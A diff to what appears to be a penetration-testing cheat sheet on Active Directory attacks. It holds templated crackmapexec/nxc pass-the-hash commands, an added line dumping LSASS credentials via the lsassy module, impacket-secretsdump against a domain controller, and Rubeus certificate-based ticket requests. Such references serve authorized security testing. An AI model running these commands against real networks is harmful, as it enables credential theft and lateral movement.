@@ -413,6 +413,7 @@ crackmapexec smb {{TARGET_IP}} -u Administrator -H {{NTLM_HASH}} --local-auth
 nxc smb {{SUBNET}} -u Administrator -H {{NTLM_HASH}} --local-auth                        # local-admin reuse sweep
 nxc smb {{DC_IP}} -u {{USERNAME}} -H {{NTLM_HASH}}                                       # domain PtH
 nxc smb {{TARGET_IP}} -u Administrator -H {{NTLM_HASH}} -x whoami                        # -x cmd / -X ps / --sam / --lsa
+nxc smb {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}' -M lsassy
 ```
 
 > Works for **domain accounts** and the **built-in local Administrator (RID 500)** — a 2014 update
@@ -560,4 +561,3 @@ impacket-secretsdump -just-dc-user {{DOMAIN_NB}}/administrator -k -no-pass "{{CO
 # or use the DC cert with Rubeus to PTT
 .\Rubeus.exe asktgt /user:{{COMPUTER_NAME}}$ /certificate:<B64> /ptt
 ```
-
